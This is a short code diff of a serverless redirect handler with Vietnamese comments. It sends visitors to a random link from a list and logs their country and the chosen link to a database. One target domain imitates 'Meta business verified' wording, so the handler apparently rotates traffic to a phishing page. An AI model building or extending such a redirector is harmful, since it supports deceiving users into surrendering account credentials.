@@ -1,18 +1,11 @@
 export default async function handler(req, res) {
   const targetLinks = [
     "https://meta-businessverified-for-theta.vercel.app/",
-    "https://your-second-link.vercel.app",
-    "https://your-third-link.vercel.app"
+    "https://link-du-phong-2.vercel.app",
+    "https://link-du-phong-3.vercel.app"
   ];
 
   const randomLink = targetLinks[Math.floor(Math.random() * targetLinks.length)];
-
-  // Nhận diện thiết bị và quốc gia
-  const ua = req.headers['user-agent'] || '';
-  let device = "Desktop";
-  if (/mobile/i.test(ua)) device = "Mobile";
-  else if (/tablet|ipad/i.test(ua)) device = "Tablet";
-
   const country = req.headers['x-vercel-ip-country'] || 'Unknown';
 
   try {
@@ -25,8 +18,8 @@ export default async function handler(req, res) {
         "Prefer": "return=minimal"
       },
       body: JSON.stringify({
-        country: country,
-        device: device,
+        link: randomLink, // Lưu vào cột link bạn đã có
+        country: country, // Lưu vào cột country bạn đã có
         created_at: new Date().toISOString()
       })
     });
